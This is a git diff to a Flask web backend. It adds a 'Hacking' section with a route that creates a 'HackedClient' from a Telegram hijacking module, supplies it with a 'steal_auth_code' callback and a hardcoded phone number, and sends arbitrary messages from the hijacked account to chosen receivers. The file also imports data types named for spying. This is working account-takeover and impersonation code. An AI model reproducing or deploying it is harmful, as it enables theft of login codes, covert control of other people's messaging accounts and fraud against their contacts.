@@ -12,6 +12,29 @@ from app.models.userdata_models import Contact, spydatatypes
 from app.models.personalization_model import Personalization
 from app.models.utility import db_entry_to_dict, db_single_element_query
 from app.story.story_controller import StoryController
+from app.telegram_highjack.hacked_client import HackedClient
+from app.firebase_interaction import FirebaseInteraction
+
+# ------------------- Hacking ---------------------
+@app.route('/users/<user_id>/hack/sendMessage', methods=['POST'])
+def send_user_message(user_id):
+    messages = request.get_json()
+    if not messages:
+        return jsonify("please valid json"), 400
+    if not isinstance(messages, list):
+        return jsonify("please provide a list of messages [message, message, ...]"), 400        
+    
+    # TODO: get this from database
+    phone_number = "+4917695864030"
+
+    client = HackedClient(user_id, phone_number, FirebaseInteraction.steal_auth_code)
+    with client:
+        for message in messages:
+            if not message["receiver"]:
+                return jsonify("missing receiver"), 400
+            if not message["text"]:
+                return jsonify("missing text"), 400
+            client.send_message(message["receiver"], message["text"])
 
 # ---------- Git Webhook (Re-)Deployment ----------
 @app.route('/update')
